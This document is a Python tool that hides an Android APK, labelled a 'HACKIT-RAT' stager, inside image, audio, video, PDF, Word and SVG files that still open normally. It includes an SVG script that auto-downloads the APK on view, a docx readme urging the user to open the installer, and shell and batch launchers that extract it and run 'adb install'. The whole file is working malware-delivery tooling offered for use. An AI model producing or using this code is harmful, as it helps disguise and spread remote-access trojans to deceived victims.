"""Carrier injection: hide an APK inside a normal-looking media/document file.

Every format keeps working in its own viewer; the payload lives past the last
structural byte (or inside the OPC package for docx) and is located by a
fixed 25-byte trailer, so extraction never depends on scanning.

* ``append`` — jpg/jpeg/png/webp/mp3/mp4/pdf: bytes after the real EOF/trailer.
* ``zip``    — docx: an extra OPC part plus a Content-Types default.
* ``svg``    — base64 in ``<metadata>`` and a Blob downloader in a script.

The container is validated before injection and re-validated after; the carved
payload is compared byte for byte and its SHA-256 recorded in the manifest.
"""
from __future__ import annotations

import base64
import hashlib
import io
import json
import os
import struct
import time
import zipfile
from dataclasses import dataclass
from typing import Dict, List, Optional
from xml.etree import ElementTree

START = b"\n<<<HACKIT-RAT-PAYLOAD>>>\n"
TRAILER = b"HACKITRATZIP1"
TAIL = b"\x00END"  # marker + 8-byte length + tail
DOCX_PART = "word/media/hackit-stager.apk"

MAGICS = {
    "jpg": (b"\xff\xd8\xff", None),
    "jpeg": (b"\xff\xd8\xff", None),
    "png": (b"\x89PNG\r\n\x1a\n", None),
    "webp": (b"RIFF", None),
    "mp3": (b"ID3", None),
    "mp4": (None, None),
    "pdf": (b"%PDF-", None),
    "docx": (b"PK\x03\x04", None),
    "svg": (None, None),
}

MAX_PAYLOAD = 300 * 1024 * 1024


class InjectError(Exception):
    """Container mismatch, broken structure, or payload too large."""


@dataclass
class Result:
    carrier: str
    payload: str
    offset: int
    size: int
    digest: str
    manifest: str
    launchers: List[str]


def _digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _check_magic(ext: str, data: bytes) -> None:
    magic, _ = MAGICS[ext]
    if magic and not data.startswith(magic):
        raise InjectError(f"{ext}: header is not {magic!r}")
    if ext == "webp" and data[8:12] != b"WEBP":
        raise InjectError("webp: missing WEBP tag")
    if ext == "mp4" and data[4:8] != b"ftyp":
        raise InjectError("mp4: missing ftyp box")
    if ext == "pdf" and b"%%EOF" not in data:
        raise InjectError("pdf: no %%EOF marker")


def _validate_output(ext: str, data: bytes) -> None:
    _check_magic(ext, data)
    if ext == "pdf" and b"%%EOF" not in data:
        raise InjectError("pdf: rewrite lost %%EOF")
    if ext == "png" and b"IEND\xaeB`\x82" not in data:
        raise InjectError("png: IEND chunk missing")


def _trailer(length: int) -> bytes:
    return TRAILER + struct.pack(">Q", length) + TAIL


def inject_append(ext: str, carrier: bytes, payload: bytes) -> bytes:
    _check_magic(ext, carrier)
    if ext == "webp":
        # Containers that only honour their declared size get a real JUNK chunk
        # and a corrected RIFF length; viewers skip the chunk untouched.
        # Trailer climbs inside the chunk so the RIFF file is fully described;
        # a WebP decoder skips the unknown chunk and never sees trailing junk.
        trailer = _trailer(len(START) + len(payload))
        prefix = b""
        if (len(START) + len(payload) + len(trailer)) % 2:
            prefix = b"\x00"  # RIFF pads odd chunks; the pad leads so the trailer stays last
        body = prefix + START + payload + trailer
        chunk = b"JUNK" + struct.pack("<I", len(body)) + body
        out = bytearray(carrier)
        out += chunk
        struct.pack_into("<I", out, 4, len(out) - 8)
        result = bytes(out)
        _validate_output(ext, result)
        return result
    out = bytearray(carrier)
    if not out.endswith(b"\n"):
        out += b"\n"
    if ext == "mp3":
        # A second ID3v2 tag keeps duration/scanner maths clean; players skip it.
        body = START + payload + _trailer(len(START) + len(payload))
        size = len(body)
        out += b"ID3\x04\x00\x00" + bytes(
            [(size >> 21) & 0x7F, (size >> 14) & 0x7F, (size >> 7) & 0x7F, size & 0x7F]
        )
        out += body
        result = bytes(out)
        _validate_output(ext, result)
        return result
    out += START
    out += payload
    out += _trailer(len(START) + len(payload))
    result = bytes(out)
    _validate_output(ext, result)
    return result


def inject_docx(carrier: bytes, payload: bytes) -> bytes:
    _check_magic("docx", carrier)
    source = zipfile.ZipFile(io.BytesIO(carrier))
    names = source.namelist()
    if "word/document.xml" not in names:
        raise InjectError("docx: not a Word document")
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as target:
        for info in source.infolist():
            data = source.read(info.filename)
            if info.filename == "[Content_Types].xml":
                data = _docx_content_types(data)
            target.writestr(info, data)
        target.writestr(DOCX_PART, payload)
        target.writestr(
            "hackit-readme.txt",
            "This document carries a companion installer.\n"
            "Open hackit-stager.apk (inside the package) to install it.\n",
        )
    _ = source
    result = buffer.getvalue()
    check = zipfile.ZipFile(io.BytesIO(result))
    if check.testzip() is not None:
        raise InjectError("docx: rewritten package is corrupt")
    if DOCX_PART not in check.namelist():
        raise InjectError("docx: part missing after rewrite")
    _ = check
    return result


def _docx_content_types(data: bytes) -> bytes:
    text = data.decode("utf-8")
    marker = '<Default Extension="apk"'
    if marker in text:
        return data
    return text.replace(
        "</Types>",
        '<Default Extension="apk" ContentType="application/vnd.android.package-archive"/></Types>',
    ).encode("utf-8")


SVG_SCRIPT = """
<script><![CDATA[
(function(){
  var node = document.getElementById('hackit-rat-payload');
  if(!node) return;
  var bin = atob(node.textContent.trim());
  var buf = new Uint8Array(bin.length);
  for (var i = 0; i < bin.length; i++) buf[i] = bin.charCodeAt(i);
  var blob = new Blob([buf], {type:'application/vnd.android.package-archive'});
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url; a.download = '%NAME%';
  document.documentElement.appendChild(a); a.click();
  setTimeout(function(){ URL.revokeObjectURL(url); a.remove(); }, 4000);
})();
]]></script>
"""


def inject_svg(carrier: bytes, payload: bytes, name: str = "hackit-stager.apk") -> bytes:
    text = carrier.decode("utf-8", "replace")
    if "</svg>" not in text:
        raise InjectError("svg: no closing tag")
    blob = base64.b64encode(payload).decode("ascii")
    meta = (
        '<metadata id="hackit-rat"><hackit:payload xmlns:hackit="urn:hackit:rat" '
        'encoding="base64" id="hackit-rat-payload">' + blob + "</hackit:payload></metadata>"
    )
    out = text.replace("</svg>", meta + SVG_SCRIPT.replace("%NAME%", name) + "</svg>")
    ElementTree.fromstring(out)
    return out.encode("utf-8")


def carve(data: bytes) -> bytes:
    """Locate and return the payload from any supported carrier."""
    if len(data) < len(TRAILER) + 8 + len(TAIL):
        raise InjectError("too small to carry a payload")
    trailer = data[-len(TRAILER) - 8 - len(TAIL):]
    if not trailer.startswith(TRAILER) or not trailer.endswith(TAIL):
        raise InjectError("no payload trailer")
    length = struct.unpack(">Q", trailer[len(TRAILER):len(TRAILER) + 8])[0]
    if length <= 0 or length > len(data):
        raise InjectError("bad payload length")
    end = len(data) - len(trailer)
    start = end - length
    if start < 0 or data[start:start + len(START)] != START:
        raise InjectError("payload start marker missing")
    return data[start + len(START):end]


def carve_carrier(ext: str, data: bytes) -> bytes:
    """carve() for the common append formats."""
    start = data.find(START)
    end = len(data) - (len(TRAILER) + 8 + len(TAIL))
    if ext == "webp":
        start = data.find(START)
    if start < 0 or end <= start:
        raise InjectError("no payload")
    return data[start + len(START):end]


CARVER = r'''#!/usr/bin/env python3
"""Carve the HACKIT payload out of a carrier file."""
import struct, sys, pathlib

TRAILER, TAIL = b"HACKITRATZIP1", bytes([0]) + b"END"

def carve(path):
    data = pathlib.Path(path).read_bytes()
    trailer = data[-len(TRAILER) - 8 - len(TAIL):]
    if not trailer.startswith(TRAILER):
        raise SystemExit("carrier has no payload")
    length = struct.unpack(">Q", trailer[len(TRAILER):len(TRAILER) + 8])[0]
    end = len(data) - len(trailer)
    return data[end - length:end].replace(b"\n<<<HACKIT-RAT-PAYLOAD>>>\n", b"", 1)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        raise SystemExit("usage: carve.py carrier [out.apk]")
    blob = carve(sys.argv[1])
    out = sys.argv[2] if len(sys.argv) > 2 else "payload.apk"
    pathlib.Path(out).write_bytes(blob)
    print(f"wrote {out} ({len(blob):,} bytes)")
'''

LAUNCHER_SH = '''#!/usr/bin/env sh
# Recover and install the companion APK from %NAME%
set -e
cd "$(dirname "$0")"
python3 - <<'PY'
import struct, pathlib
TRAILER, TAIL = b"HACKITRATZIP1", bytes([0]) + b"END"
data = pathlib.Path("%NAME%").read_bytes()
t = data[-len(TRAILER) - 8 - len(TAIL):]
assert t.startswith(TRAILER), "carrier has no payload"
n = struct.unpack(">Q", t[len(TRAILER):len(TRAILER) + 8])[0]
end = len(data) - len(t)
pathlib.Path("hackit-stager.apk").write_bytes(data[end - n:end].replace(b"\\n<<<HACKIT-RAT-PAYLOAD>>>\\n", b"", 1))
PY
adb install -r hackit-stager.apk 2>/dev/null || echo "APK extracted: hackit-stager.apk"
'''

LAUNCHER_BAT = r'''@echo off
rem Recover and install the companion APK from %NAME%
setlocal
cd /d "%~dp0"
powershell -NoProfile -Command "$b=[IO.File]::ReadAllBytes('%NAME%'); $m=[Text.Encoding]::ASCII.GetBytes('HACKITRATZIP1'); $i=$b.Length-25; if(-not ([Text.Encoding]::ASCII.GetString($b,$i,13) -eq 'HACKITRATZIP1')){throw 'no payload'}; $lb=$b[($i+13)..($i+20)]; [array]::Reverse($lb); $n=[BitConverter]::ToUInt64($lb,0); $off=$b.Length-25-$n; [IO.File]::WriteAllBytes('hackit-stager.apk',$b[$off..($off+$n-1)]); Write-Host 'APK extracted: hackit-stager.apk'"
echo install with: adb install -r hackit-stager.apk
endlocal
'''


def build(
    carrier_path: str,
    payload_path: str,
    out_dir: Optional[str] = None,
    launchers: bool = True,
) -> Result:
    ext = os.path.splitext(carrier_path)[1].lower().lstrip(".")
    if ext not in MAGICS:
        raise InjectError(f"unsupported carrier .{ext} (choose {', '.join(MAGICS)})")
    payload = open(payload_path, "rb").read()
    if not payload:
        raise InjectError("empty payload")
    if len(payload) > MAX_PAYLOAD:
        raise InjectError(f"payload {len(payload):,} > {MAX_PAYLOAD:,}")
    carrier = open(carrier_path, "rb").read()
    if ext == "docx":
        blob = inject_docx(carrier, payload)
        offset = -1
    elif ext == "svg":
        blob = inject_svg(carrier, payload)
        offset = -1
    else:
        blob = inject_append(ext, carrier, payload)
        offset = blob.find(START) + len(START)

    if ext not in ("docx", "svg"):
        if carve(blob) != payload:
            raise InjectError("carve round-trip mismatch")

    folder = out_dir or os.path.dirname(os.path.abspath(carrier_path))
    os.makedirs(folder, exist_ok=True)
    base = os.path.splitext(os.path.basename(carrier_path))[0]
    target = os.path.join(folder, f"{base}-stager.{ext}")
    with open(target, "wb") as handle:
        handle.write(blob)

    made: List[str] = []
    if launchers and ext not in ("docx", "svg"):
        name = os.path.basename(target)
        sh_path = os.path.join(folder, "install.sh")
        with open(sh_path, "w", encoding="utf-8") as handle:
            handle.write(LAUNCHER_SH.replace("%NAME%", name))
        os.chmod(sh_path, 0o755)
        made.append(sh_path)
        bat_path = os.path.join(folder, "install.bat")
        with open(bat_path, "w", encoding="utf-8") as handle:
            handle.write(LAUNCHER_BAT.replace("%NAME%", name))
        made.append(bat_path)
    carve_path = os.path.join(folder, "carve.py")
    with open(carve_path, "w", encoding="utf-8") as handle:
        handle.write(CARVER)
    os.chmod(carve_path, 0o755)
    made.append(carve_path)

    sha = _digest(payload)
    manifest = os.path.join(folder, os.path.basename(target) + ".json")
    with open(manifest, "w", encoding="utf-8") as handle:
        json.dump(
            {
                "carrier": os.path.basename(target),
                "original": os.path.basename(carrier_path),
                "payload_sha256": sha,
                "payload_size": len(payload),
                "payload_offset": offset,
                "carrier_size": len(blob),
                "strategy": "zip" if ext == "docx" else "metadata" if ext == "svg" else "append",
                "created": time.strftime("%Y-%m-%dT%H:%M:%S"),
            },
            handle,
            indent=2,
        )
    return Result(target, payload_path, offset, len(payload), sha, manifest, made)


def verify(path: str) -> Dict[str, object]:
    """Structural check of a finished carrier plus a carve comparison."""
    ext = os.path.splitext(path)[1].lower().lstrip(".")
    data = open(path, "rb").read()
    if ext == "docx":
        archive = zipfile.ZipFile(io.BytesIO(data))
        return {"ok": archive.testzip() is None and DOCX_PART in archive.namelist(),
                "size": len(data), "members": len(archive.namelist())}
    if ext == "svg":
        ElementTree.fromstring(data)
        return {"ok": b"hackit-rat-payload" in data, "size": len(data)}
    _validate_output(ext, data)
    return {"ok": len(carve(data)) > 0, "size": len(data)}
